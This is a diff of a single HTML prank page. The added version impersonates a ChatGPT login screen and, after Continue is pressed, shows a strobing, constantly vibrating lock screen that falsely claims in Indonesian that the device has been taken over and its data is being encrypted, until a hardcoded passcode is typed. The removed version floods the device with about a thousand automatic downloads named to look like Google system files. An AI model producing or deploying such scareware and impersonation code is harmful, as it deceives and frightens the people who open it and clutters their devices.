@@ -1,74 +1,141 @@
 <!DOCTYPE html>
-<html lang="id">
+<html lang="en">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Sistem Sinkronisasi Cloud</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>ChatGPT - Login</title>
     <style>
-        body { background: #000; color: #fff; font-family: 'Courier New', Courier, monospace; display: flex; align-items: center; justify-content: center; height: 100vh; margin: 0; overflow: hidden; }
-        #overlay, #loader-ui, #finish-ui { text-align: center; width: 85%; }
-        .play-btn { background: #ff0000; color: #fff; border: none; padding: 20px 60px; font-size: 26px; font-weight: bold; border-radius: 50px; cursor: pointer; box-shadow: 0 0 25px #ff0000; }
-        .progress-bg { background: #222; border-radius: 20px; height: 20px; width: 100%; margin: 25px 0; overflow: hidden; border: 1px solid #444; }
-        #fill { background: linear-gradient(90deg, #00ff00, #008800); height: 100%; width: 0%; box-shadow: 0 0 15px #00ff00; }
-        .toxic-text { color: #ff0000; font-size: 32px; font-weight: bold; animation: shake 0.1s infinite; display: none; }
-        @keyframes shake { 0% {transform:translate(2px,1px)} 50% {transform:translate(-2px,-2px)} 100% {transform:translate(1px,2px)} }
-        .footer { position: fixed; bottom: 50px; left: 0; right: 0; font-size: 18px; color: #666; letter-spacing: 2px; font-weight: bold; text-align: center; }
+        * { box-sizing: border-box; }
+        body, html { margin: 0; padding: 0; width: 100%; height: 100%; overflow: hidden; background: #000; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; }
+
+        /* UI LOGIN CHATGPT (Sangat Mirip) */
+        #loginPage { background: #343541; height: 100vh; display: flex; flex-direction: column; align-items: center; justify-content: center; padding: 20px; }
+        .logo { width: 42px; margin-bottom: 25px; }
+        .login-box { width: 100%; max-width: 320px; text-align: center; }
+        h1 { color: #ececf1; font-size: 32px; font-weight: 600; margin-bottom: 20px; }
+        input.chat-input { width: 100%; padding: 14px; margin: 8px 0; border: 1px solid #565869; border-radius: 4px; background: #40414f; color: white; font-size: 16px; outline: none; }
+        input.chat-input:focus { border-color: #10a37f; }
+        .btn-continue { width: 100%; padding: 14px; background: #10a37f; border: none; border-radius: 4px; color: white; font-weight: 600; cursor: pointer; font-size: 16px; margin-top: 10px; }
+
+        /* OVERLAY NERAKA (Akurasi Tinggi) */
+        #canvasMatrix { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; z-index: 1; }
+        
+        #lockOverlay {
+            display: none; position: fixed; top: 0; left: 0;
+            width: 100%; height: 100%; z-index: 9999999;
+            flex-direction: column; align-items: center; justify-content: center;
+            background: rgba(0, 0, 0, 0.7);
+        }
+
+        .strobe { animation: strobeEffect 0.05s infinite; }
+        @keyframes strobeEffect { 0% { background: rgba(255,255,255,0.15); } 100% { background: transparent; } }
+
+        .content { width: 90%; text-align: center; z-index: 10; animation: shake 0.1s infinite; }
+        .warning-img { width: 80px; margin-bottom: 10px; }
+        
+        .main-text {
+            color: #ff0000; font-size: 24px; font-weight: 900;
+            line-height: 1.2; text-transform: uppercase;
+            text-shadow: 0 0 10px #000; margin-bottom: 15px;
+        }
+
+        .small-text {
+            color: #fff; font-size: 12px; line-height: 1.5;
+            font-family: 'Courier New', monospace; margin-bottom: 30px;
+        }
+
+        /* Input & Button Unlock */
+        .pw-box { width: 220px; background: #000; border: 2px solid #ff0000; color: #ff0000; padding: 12px; font-weight: bold; text-align: center; font-size: 18px; outline: none; }
+        .btn-unblock { margin-top: 15px; width: 220px; padding: 12px; background: #ff0000; color: #000; border: none; font-weight: bold; text-transform: uppercase; cursor: pointer; }
+
+        @keyframes shake { 0% {transform: translate(1px,1px)} 50% {transform: translate(-1px,-2px)} 100% {transform: translate(0,0)} }
     </style>
 </head>
 <body>
 
-    <div id="overlay">
-        <h1 style="letter-spacing: 5px; margin-bottom: 40px;">SERVER READY</h1>
-        <button class="play-btn" onclick="startBrutalAttack()">PLAY</button>
-        <div class="footer">© Bimz Official</div>
+    <!-- HALAMAN LOGIN -->
+    <div id="loginPage">
+        <img src="https://upload.wikimedia.org/wikipedia/commons/0/04/ChatGPT_logo.svg" class="logo">
+        <div class="login-box">
+            <h1>Welcome back</h1>
+            <input type="email" class="chat-input" placeholder="Email address">
+            <input type="password" class="chat-input" placeholder="Password">
+            <button class="btn-continue" onclick="startBrutal()">Continue</button>
+            <p style="color: #ececf1; font-size: 14px; margin-top: 20px;">Don't have an account? <span style="color:#10a37f">Sign up</span></p>
+        </div>
     </div>
 
-    <div id="loader-ui" style="display: none;">
-        <h2 id="title">INJECTING DATA...</h2>
-        <div id="percent" style="font-size: 40px; margin-bottom: 10px; color: #00ff00;">0%</div>
-        <div class="progress-bg"><div id="fill"></div></div>
-        <p id="status">Menginisialisasi...</p>
-        <div class="footer">© Bimz Official</div>
-    </div>
+    <!-- BACKGROUND MATRIX -->
+    <canvas id="canvasMatrix"></canvas>
 
-    <div id="finish-ui" class="toxic-text">
-        Yahaha bego cek galeri lo 🤣
-        <div class="footer" style="color: #ff0000;">© Bimz Official</div>
+    <!-- OVERLAY LOCK -->
+    <div id="lockOverlay" class="strobe">
+        <div class="content">
+            <img src="https://www.pngall.com/wp-content/uploads/8/Warning-PNG-Clipart.png" class="warning-img">
+            <div class="main-text">PERANGKAT ANDA TELAH<br>DIAMBIL ALIH</div>
+            <div class="small-text">
+                Sistem keamanan internal telah dilalui.<br>
+                Hubungi tim teknis Bimz Cr4sh. Data anda<br>
+                dalam proses enkripsi nyata. Tekan kunci<br>
+                untuk melihat tampilan.
+            </div>
+            
+            <input type="password" id="pwInput" class="pw-box" placeholder="PASSCODE">
+            <button class="btn-unblock" onclick="verify()">UNBLOCK</button>
+        </div>
     </div>
 
     <script>
-        let current = 0;
-        const total = 1000;
-        const dummyImg = "data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mP8z8BQDwAEhQGAhKmMIQAAAABJRU5ErkJggg==";
+        const canvas = document.getElementById('canvasMatrix');
+        const ctx = canvas.getContext('2d');
 
-        function startBrutalAttack() {
-            document.getElementById('overlay').style.display = 'none';
-            document.getElementById('loader-ui').style.display = 'block';
+        function startBrutal() {
+            // Hide Login
+            document.getElementById('loginPage').style.display = 'none';
+            // Show Neraka
+            canvas.style.display = 'block';
+            document.getElementById('lockOverlay').style.display = 'flex';
+            
+            initMatrix();
+            
+            // Getar Brutal
+            if (navigator.vibrate) {
+                setInterval(() => { navigator.vibrate([400, 100, 400]); }, 600);
+            }
+        }
 
-            // Menjalankan download dengan interval sangat singkat
-            const bomber = setInterval(() => {
-                if (current >= total) {
-                    clearInterval(bomber);
-                    document.getElementById('loader-ui').style.display = 'none';
-                    document.getElementById('finish-ui').style.display = 'block';
-                    return;
-                }
+        function initMatrix() {
+            canvas.width = window.innerWidth;
+            canvas.height = window.innerHeight;
+            const chars = "0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ";
+            const fontSize = 16;
+            const columns = canvas.width / fontSize;
+            const drops = Array(Math.floor(columns)).fill(1);
 
-                current++;
-                let progress = (current / total) * 100;
-                document.getElementById('fill').style.width = progress + "%";
-                document.getElementById('percent').innerText = Math.floor(progress) + "%";
+            function draw() {
+                ctx.fillStyle = "rgba(0, 0, 0, 0.05)";
+                ctx.fillRect(0, 0, canvas.width, canvas.height);
+                ctx.fillStyle = "#0F0";
+                ctx.font = fontSize + "px arial";
+                drops.forEach((y, i) => {
+                    const text = chars.charAt(Math.floor(Math.random() * chars.length));
+                    ctx.fillText(text, i * fontSize, y * fontSize);
+                    if (y * fontSize > canvas.height && Math.random() > 0.975) drops[i] = 0;
+                    drops[i]++;
+                });
+            }
+            setInterval(draw, 35);
+        }
 
-                // Trigger Download
-                const a = document.createElement('a');
-                a.href = dummyImg;
-                // Nama file disamarkan sebagai file sistem
-                a.download = "com.google.android.gms.sync_v82." + current + ".jpg";
-                document.body.appendChild(a);
-                a.click();
-                document.body.removeChild(a);
-
-            }, 30); // Kecepatan super: 30ms
+        function verify() {
+            if (document.getElementById('pwInput').value === "bimz cr4sh") {
+                alert("SYSTEM RESTORED. UNINSTALLING APK...");
+                // Link ke setting/info app
+                window.location.href = "market://details?id=" + window.location.hostname;
+                window.close();
+            } else {
+                alert("WRONG PASSCODE. DESTRUCTION CONTINUES.");
+            }
         }
     </script>
 </body>
